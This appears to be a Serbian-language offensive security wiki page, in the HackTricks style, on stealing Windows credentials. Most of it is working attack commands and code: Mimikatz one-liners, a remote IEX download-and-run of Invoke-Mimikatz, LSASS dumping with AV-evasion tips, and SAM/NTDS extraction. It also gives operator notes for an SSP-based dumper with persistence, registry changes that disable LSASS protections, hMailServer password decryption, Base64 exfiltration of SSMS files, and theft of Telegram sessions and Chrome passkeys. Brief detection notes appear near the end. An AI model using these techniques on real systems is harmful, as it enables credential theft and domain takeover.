# Krađa Windows akreditiva

{{#include ../../banners/hacktricks-training.md}}

## Akreditivi Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pronađite druge stvari koje Mimikatz može da radi na** [**ovoj stranici**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Saznajte više o nekim mogućim zaštitama kredencijala ovde.**](credentials-protections.md) **Ove zaštite mogu sprečiti Mimikatz da izdvoji neke kredencijale.**

## Kredencijali sa Meterpreterom

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam kreirao da **pretražite lozinke i hash-eve** unutar žrtve.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Zaobilaženje AV-a

### Procdump + Mimikatz

Pošto **Procdump iz** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)** predstavlja legitiman Microsoft alat**, Defender ga ne detektuje.\
Ovaj alat možete koristiti za **dump lsass procesa**, **preuzimanje dump-a** i **lokalno izvlačenje** **kredencijala** iz dump-a.

Možete koristiti i [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ovaj proces se automatski obavlja pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** mogu **detektovati** korišćenje **procdump.exe za dump lsass.exe** kao **zlonamerno**, jer **detektuju** stringove **"procdump.exe" i "lsass.exe"**. Zato je **neupadljivije** proslediti **PID** procesa lsass.exe kao **argument** alatu procdump, **umesto** imena lsass.exe.

### Dump lsass pomoću **comsvcs.dll**

DLL pod nazivom **comsvcs.dll**, koji se nalazi u `C:\Windows\System32`, odgovoran je za **dump memorije procesa** u slučaju pada. Ovaj DLL sadrži **funkciju** pod nazivom **`MiniDumpW`**, koja je namenjena za pozivanje pomoću `rundll32.exe`.\
Prva dva argumenta nisu bitna, ali je treći podeljen na tri komponente. ID procesa koji treba dump-ovati predstavlja prvu komponentu, lokacija dump fajla predstavlja drugu, a treća komponenta mora biti isključivo reč **full**. Ne postoje alternativne opcije.\
Nakon parsiranja ove tri komponente, DLL se koristi za kreiranje dump fajla i prenos memorije navedenog procesa u taj fajl.\
**comsvcs.dll** može da se koristi za dump lsass procesa, čime se uklanja potreba za uploadovanjem i izvršavanjem alata procdump. Ovaj metod je detaljno opisan na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Za izvršavanje se koristi sledeća komanda:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Ovaj proces možete automatizovati pomoću** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Pravljenje dump-a lsass-a pomoću Task Manager-a**

1. Kliknite desnim tasterom miša na traku zadataka i kliknite na Task Manager
2. Kliknite na More details
3. Pronađite proces "Local Security Authority Process" na kartici Processes
4. Kliknite desnim tasterom miša na proces "Local Security Authority Process" i kliknite na "Create dump file".

### Pravljenje dump-a lsass-a pomoću procdump-a

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je Microsoft-ov potpisani binarni fajl koji je deo paketa [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpovanje lsass-a pomoću PPLBlade-a

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je alat za dumpovanje zaštićenih procesa koji podržava obfuskaciju memory dump-a i njegovo prenošenje na udaljene workstations bez upisivanja na disk.

**Ključne funkcionalnosti**:

1. Zaobilaženje PPL zaštite
2. Obfuskacija memory dump fajlova radi izbegavanja Defender mehanizama za detekciju zasnovanih na potpisima
3. Upload memory dump-a pomoću RAW i SMB metoda za upload bez upisivanja na disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon isporučuje dumper u tri faze pod nazivom **LalsDumper**, koji nikada ne poziva `MiniDumpWriteDump`, pa se EDR hook-ovi na tom API-ju nikada ne aktiviraju:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – pretražuje `fdp.dll` u potrazi za placeholder-om koji se sastoji od 32 malih slova `d`, zamenjuje ga apsolutnom putanjom do `rtu.txt`, čuva izmenjeni DLL kao `nfdp.dll` i poziva `AddSecurityPackageA("nfdp","fdp")`. Ovo primorava **LSASS** da učita malicious DLL kao novi Security Support Provider (SSP).
2. **Stage 2 unutar LSASS-a** – kada LSASS učita `nfdp.dll`, DLL čita `rtu.txt`, XOR-uje svaki byte sa `0x20` i mapira dekodirani blob u memoriju pre nego što prosledi izvršavanje.
3. **Stage 3 dumper** – mapirani payload ponovo implementira MiniDump logiku koristeći **direct syscalls** razrešene iz hash-ovanih API imena (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Poseban export pod nazivom `Tom` otvara `%TEMP%\<pid>.ddt`, upisuje kompresovani LSASS dump u fajl i zatvara handle, tako da exfiltration može da se obavi kasnije.

Napomene za operatora:

* Držite `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` u istom direktorijumu. Stage 1 zamenjuje hard-coded placeholder apsolutnom putanjom do `rtu.txt`, pa njihovo razdvajanje prekida lanac.
* Registracija se obavlja dodavanjem `nfdp` u `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Tu vrednost možete sami postaviti kako bi LSASS ponovo učitavao SSP pri svakom boot-u.
* `%TEMP%\*.ddt` fajlovi su kompresovani dump-ovi. Dekomprimujte ih lokalno, a zatim ih prosledite alatima Mimikatz/Volatility za extraction credentials.
* Pokretanje `lals.exe` zahteva admin/SeTcb privilegije kako bi `AddSecurityPackageA` uspeo; kada se poziv završi, LSASS transparentno učitava rogue SSP i izvršava Stage 2.
* Uklanjanje DLL-a sa diska ne izbacuje ga iz LSASS-a. Ili obrišite registry entry i restartujte LSASS (reboot), ili ga ostavite radi dugoročne persistence.

## CrackMapExec

### Dump SAM hash-eva
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump NTDS.dit sa ciljnog DC-a
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Izvuci istoriju lozinki iz NTDS.dit datoteke sa ciljnog DC-a
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Prikaži atribut pwdLastSet za svaki NTDS.dit nalog
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Krađa SAM i SYSTEM

Ove datoteke bi trebalo da se nalaze u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Međutim, **ne možete ih jednostavno kopirati na uobičajen način** jer su zaštićene.

### Iz Registry-ja

Najlakši način da ukradete te datoteke jeste da preuzmete njihovu kopiju iz Registry-ja:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Preuzmite** te fajlove na svoju Kali mašinu i **izvucite hash-eve** koristeći:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Pomoću ove usluge možete kopirati zaštićene datoteke. Morate biti Administrator.

#### Using vssadmin

Binarna datoteka vssadmin dostupna je samo u Windows Server verzijama
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ali isto možete uraditi iz **Powershell**-a. Ovo je primer **kako da kopirate SAM datoteku** (korišćeni hard disk je "C:", a datoteka je sačuvana u C:\users\Public), ali ovo možete koristiti za kopiranje bilo koje zaštićene datoteke:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kod iz knjige: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Na kraju, možete koristiti i [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju datoteka SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory credentials - NTDS.dit**

Datoteka **NTDS.dit** poznata je kao srce sistema **Active Directory** i sadrži ključne podatke o korisničkim objektima, grupama i njihovim članstvima. U njoj se čuvaju **password hashes** korisnika domena. Ova datoteka je baza podataka **Extensible Storage Engine (ESE)** i nalazi se na lokaciji **_%SystemRoom%/NTDS/ntds.dit_**.

U ovoj bazi podataka održavaju se tri primarne tabele:

- **Data Table**: Ova tabela služi za čuvanje detalja o objektima kao što su korisnici i grupe.
- **Link Table**: Prati odnose, kao što su članstva u grupama.
- **SD Table**: Ovde se čuvaju **security descriptors** za svaki objekat, čime se obezbeđuju sigurnost i kontrola pristupa sačuvanim objektima.

Istraživanje Christoffera Anderssona o database layer-u detaljnije dokumentuje ove tabele i njihovo ponašanje u zavisnosti od verzije.<sup>[[8]](#references)</sup>

Windows koristi _Ntdsa.dll_ za interakciju sa tom datotekom, a nju koristi _lsass.exe_. Zatim se **deo** datoteke **NTDS.dit** može nalaziti **unutar memorije procesa `lsass`** (verovatno možete pronaći najnovije pristupljene podatke zbog poboljšanja performansi korišćenjem **cache-a**).

#### Dešifrovanje hash-eva unutar NTDS.dit

Hash je šifrovan tri puta:

1. Dešifrujte Password Encryption Key (**PEK**) pomoću **BOOTKEY**-a i **RC4**-a.
2. Dešifrujte **hash** pomoću **PEK**-a i **RC4**-a.
3. Dešifrujte **hash** pomoću **DES**-a.

**PEK** ima **istu vrednost na svakom domain controller-u**, ali je **NTDS.dit** šifrovan pomoću **BOOTKEY**-a specifičnog za DC, koji potiče iz **SYSTEM** hive-a tog domain controller-a. Zato je za izvlačenje credentials-a potrebno imati i **NTDS.dit** i **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Kopiranje NTDS.dit pomoću Ntdsutil-a

Dostupno od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Takođe možete koristiti trik [**volume shadow copy**](#stealing-sam-and-system) da kopirate datoteku **ntds.dit**. Imajte na umu da će vam takođe biti potrebna kopija **SYSTEM datoteke** (ponovo, koristite trik [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)).

### **Izdvajanje hash-eva iz NTDS.dit**

Kada **nabavite** datoteke **NTDS.dit** i **SYSTEM**, možete koristiti alate kao što je _secretsdump.py_ za **izdvajanje hash-eva**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Takođe ih možete **automatski izvući koristeći važećeg korisnika administratora domena:**
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Za **velike NTDS.dit datoteke** preporučuje se ekstrakcija pomoću alata [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na kraju, možete koristiti i **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Ekstrakcija domain objekata iz NTDS.dit datoteke u SQLite bazu podataka**

NTDS objekti mogu se ekstraktovati u SQLite bazu podataka pomoću alata [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ne ekstraktuju se samo secrets već i čitavi objekti i njihovi atributi, što omogućava dalju ekstrakciju informacija kada je sirova NTDS.dit datoteka već preuzeta.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive je opcion, ali omogućava dešifrovanje secrets (NT & LM hashes, supplemental credentials kao što su cleartext passwords, kerberos ili trust keys, NT & LM password histories). Pored ostalih informacija, izdvajaju se sledeći podaci: korisnički i mašinski nalozi sa njihovim hash vrednostima, UAC flags, vremenska oznaka poslednjeg prijavljivanja i promene lozinke, opis naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizational units i članstvo, trusted domains sa tipom, smerom i atributima trustova...

## Lazagne

Preuzmite binary sa [ove lokacije](https://github.com/AlessandroZ/LaZagne/releases). Ovaj binary možete koristiti za izdvajanje credentials iz različitih software-a.
```
lazagne.exe all
```
## Drugi alati za izvlačenje kredencijala iz SAM-a i LSASS-a

### Windows credentials Editor (WCE)

Ovaj alat može da se koristi za izvlačenje kredencijala iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Izvucite kredencijale iz SAM fajla
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Izdvajanje akreditiva iz SAM datoteke
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Preuzmite ga sa: [http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i samo ga **pokrenite**, pa će lozinke biti izdvojene.

## Prikupljanje podataka iz neaktivnih RDP sesija i slabljenje bezbednosnih kontrola

FinalDraft RAT kompanije Ink Dragon uključuje `DumpRDPHistory` tasker čije su tehnike korisne svakom red-teameru:<sup>[[3]](#references)</sup>

### Prikupljanje telemetrije u stilu DumpRDPHistory

* **Odredišta odlaznog RDP-a** – analizirajte svaki korisnički hive na lokaciji `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Svaki podključ čuva ime servera, `UsernameHint` i vremensku oznaku poslednjeg upisivanja. Logiku kompanije FinalDraft možete replicirati pomoću PowerShell-a:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Dokazi o dolaznom RDP-u** – pretražite log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` za Event ID-jeve **21** (uspešna prijava) i **25** (prekid veze) da biste utvrdili ko je administrirao računar:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Kada utvrdite koji se Domain Admin redovno povezuje, izvršite dump LSASS-a (pomoću LalsDumper/Mimikatz-a) dok njihova **prekinuta** sesija još postoji. CredSSP + NTLM fallback ostavljaju njihov verifier i tokene u LSASS-u, koji se zatim mogu ponovo koristiti preko SMB/WinRM-a za preuzimanje `NTDS.dit` ili uspostavljanje persistence-a na domain controllerima.

### Registry downgrades koje cilja FinalDraft

Isti implant takođe menja nekoliko registry ključeva kako bi krađa kredencijala bila jednostavnija:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Postavljanje `DisableRestrictedAdmin=1` primorava na potpuno ponovno korišćenje kredencijala/tiketa tokom RDP-a, što omogućava pivotiranje u stilu pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` onemogućava UAC filtriranje tokena, pa lokalni administratori preko mreže dobijaju neograničene tokene.
* `DSRMAdminLogonBehavior=2` omogućava DSRM administratoru da se prijavi dok je DC aktivan, dajući napadačima još jedan ugrađeni nalog sa visokim privilegijama.
* `RunAsPPL=0` uklanja LSASS PPL zaštite, čineći pristup memoriji trivijalnim za dumpers kao što je LalsDumper.

## hMailServer kredencijali baze podataka (nakon kompromitovanja)

hMailServer čuva lozinku svoje DB u datoteci `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, u odeljku `[Database] Password=`. Vrednost je Blowfish-šifrovana pomoću statičkog ključa `THIS_KEY_IS_NOT_SECRET` i zamene endianness-a 4-bajtnih reči. Koristite hex string iz INI datoteke sa ovim Python isečkom:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Sa lozinkom u čistom tekstu, kopirajte SQL CE bazu podataka da biste izbegli zaključavanja datoteke, učitajte 32-bitni provider i po potrebi ga nadogradite pre upita nad hash vrednostima:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Kolona `accountpassword` koristi hMailServer hash format (`hashcat` mode `1421`). Cracking ovih vrednosti može obezbediti reusable credentials za WinRM/SSH pivots.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Neki alati hvataju **plaintext logon passwords** presretanjem LSA logon callback-a `LsaApLogonUserEx2`. Ideja je hook-ovati ili wrap-ovati authentication package callback tako da se credentials uhvate **tokom logon-a** (pre hashing-a), a zatim upišu na disk ili vrate operatoru. Ovo se obično implementira kao helper koji se inject-uje u LSA ili se registruje sa njim, a zatim beleži svaki uspešan interactive/network logon event sa username-om, domain-om i password-om.<sup>[[1]](#references)</sup>

Operativne napomene:
- Zahteva local admin/SYSTEM privilegije za učitavanje helper-a u authentication path.
- Captured credentials se pojavljuju samo kada dođe do logon-a (interactive, RDP, service ili network logon, u zavisnosti od hook-a).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) čuva saved connection informacije u per-user `sqlstudio.bin` fajlu. Dedicated dumpers mogu parsirati fajl i oporaviti saved SQL credentials. U shell-ovima koji vraćaju samo command output, fajl se često exfiltruje tako što se enkoduje kao Base64 i ispisuje na stdout.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Na strani operatera, ponovo izgradite datoteku i pokrenite dumper lokalno da biste povratili kredencijale:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Telegram Desktop `tdata` krađa sesije

Telegram Desktop čuva autorizaciju i stanje naloga u svom direktorijumu **`tdata`**. Kopirana sesija može da se učita pomoću kompatibilnih alata radi autentifikacije bez lozinke naloga, sve dok ta autorizacija ostane važeća; ako je omogućeno šifrovanje lokalnih podataka, stealeru je potrebna i pristupna šifra. Autentifikovana sesija zatim može da otkrije podatke o identitetu, metapodatke o dijalozima i članstvima, poruke i medije koji mogu da se preuzmu.<sup>[[10]](#references)</sup>

### Pronalaženje i preuzimanje

Pretražite instalirane i portable rasporede; nazivi paketa u Microsoft Store-u se razlikuju, zato izlistajte direktorijume paketa koji sadrže `TelegramMessenge` i proverite njihovo podstablo `LocalCache\Roaming`.<sup>[[10]](#references)</sup>
```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
Where-Object Name -Like '*TelegramMessenge*' |
ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```
Ako obična čitanja ne uspeju, a token procesa **već sadrži i omogućava** `SeBackupPrivilege`, pristup prilagođen backup-u pruža rezervnu opciju; on ne pribavlja privilegiju niti podiže nivo privilegija procesa. `CreateFileW` sa `FILE_FLAG_BACKUP_SEMANTICS` može da zatraži backup/restore semantiku i zaobiđe provere bezbednosti datoteka kada su u tokenu prisutne potrebne privilegije, ali sama zastavica ne zaobilazi nekompatibilni sharing lock.<sup>[[10]](#references)[[11]](#references)</sup>

Za trenutno zaključane datoteke napravite **Volume Shadow Copy**; za datoteke blokirane ACL-om, `robocopy /B` koristi backup režim i zaobilazi ACL-ove datoteka i direktorijuma.<sup>[[10]](#references)[[12]](#references)</sup>
```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```
Implant koji vodi računa o propusnom opsegu može najpre poslati samo inventar putanja do datoteka, primiti identifikator snapshot-a i putanje koje je C2 već sačuvao, a zatim otpremiti samo datoteke koje nedostaju. Zato mali inkrementalni transferi nakon rekurzivnog `tdata` nabrajanja i dalje mogu predstavljati uspešnu krađu sesije.<sup>[[10]](#references)</sup>

### Detekcija i obuzdavanje

Povežite rekurzivni pristup `tdata` od strane procesa koji nije Telegram sa omogućavanjem `SeBackupPrivilege`, otvaranjem datoteka sa backup-semantikom, VSS aktivnošću ili podređenim procesom `robocopy.exe` koji koristi `/B`. Takođe tražite brzo nabrajanje i `%APPDATA%` i `%LOCALAPPDATA%\Packages`, nakon čega slede izlazne veze iz istog procesa. Nakon kompromitovanja, koristite **Settings → Devices** (ili **Privacy & Security → Active Sessions**) da prekinete neprepoznate sesije; samo omogućavanje verifikacije u dva koraka ne opoziva autorizaciju koja je već ukradena.<sup>[[10]](#references)[[13]](#references)</sup>

## Krađa Passkeys / WebAuthn akreditiva iz Chrome-a na Windows-u

Ako se na Windows hostu sa **Chrome + Google Password Manager synced passkeys** dobije izvršavanje koda kao **korisnik žrtva**, passkeys postaju zanimljiva meta nakon eksploatacije, čak i **bez admin/SYSTEM** privilegija.<sup>[[4]](#references)</sup>

### Zanimljivi lokalni artefakti
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** skladišti protobuf-enkodirane zapise **`WebauthnCredentialSpecifics`**. Proces istog korisnika može da nabroji **RP ID**, **username**, **credential ID** i materijal šifrovanog privatnog ključa za sinhronizovane passkeys.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** skladišti lokalno stanje registracije uređaja, kao što su **`wrapped_identity_private_key`** i zapakovana tajna koja se koristi za oporavak sinhronizovanih credentials.<sup>[[4]](#references)</sup>

Brza trijaža:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-om vezani key blobovi i dalje mogu da se zloupotrebe kao lokalni signing oracle

Ako browser izveze identitetski ključ podržan TPM-om kao **`NCRYPT_OPAQUE_KEY_BLOB`** i sačuva taj blob u stanju dostupnom korisniku, malware **ne mora** da izvuče sirovi privatni ključ. Može jednostavno ponovo da uveze blob na **istoj mašini** i zatraži od lokalnog TPM-a da potpiše podatke pod kontrolom napadača:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Ovo znači da **hardware binding sprečava izvoz van uređaja, ali ne i korišćenje od strane istog korisnika na kompromitovanom endpointu**.

### Praktični putevi zloupotrebe

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Enumerišite `WebauthnCredentialSpecifics` iz Chrome-ovog LevelDB-a.
- Pokrenite passkey prijavu i pribavite svež WebAuthn challenge.
- Upotrebite ukradeni `wrapped_identity_private_key` blob na TPM-u žrtve da potpišete binding cloud-authenticator zahteva.
- Prosledite vraćeni assertion relying party-ju.
- Ovo je naročito korisno kada RP prihvata `userVerification=preferred` ili ne odbija assertion-e sa **`UV=0`**.
2. **Hijacking pending UV-key**<sup>[[4]](#references)</sup>
- Izazovite ponovno onboarding-ovanje brisanjem `passkey_enclave_state` ili slanjem važeće potpisane `device/forget` operacije.
- Ako onboarding ostavi uređaj u stanju **`uv_key_pending`**, registrujte UV javni ključ pod kontrolom napadača.
- Ako provider ne proverava attestation / poreklo novog UV ključa iz secure-hardware-a, kasniji potpisi napadačevog ključa tretiraju se kao **`UV=1`**.
3. **Krađa master-secret / SDS za oporavak**<sup>[[4]](#references)</sup>
- Izazovite recovery ili ponovno pridruživanje kako bi Chrome preuzeo sinhronizovani passkey master secret.
- Pratite ponovno kreiranje/izmenu `passkey_enclave_state`, zatim dump-ujte Chrome memoriju dok je plaintext **security domain secret (SDS)** prisutan.
- Upotrebite pribavljeni SDS za dešifrovanje šifrovanih polja u svakom `WebauthnCredentialSpecifics` zapisu i povratite prenosive WebAuthn privatne ključeve.

### DFIR / ideje za detekciju

- Nadgledajte **brisanje/ponovno kreiranje** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Upozorite na neuobičajen pristup Chrome **`Sync Data\LevelDB`** od strane procesa koji nisu browser.
- Upozorite na **dump-ove Chrome memorije** ili sumnjiv pristup memoriji između procesa.
- Istražite ponovljene zahteve za **Google Password Manager recovery PIN** ili neočekivano ponovno onboarding-ovanje.
- Imajte na umu da WebAuthn **`signCount`** često nije koristan za sinhronizovane passkey-je jer može ostati konstantan, pa je klasična detekcija klonova slaba.

## References

- [1] [Unit 42 – Istraga višegodišnjih neotkrivenih operacija usmerenih na sektore visoke vrednosti](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing putem SMTP-a → dešifrovanje hMailServer kredencijala → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
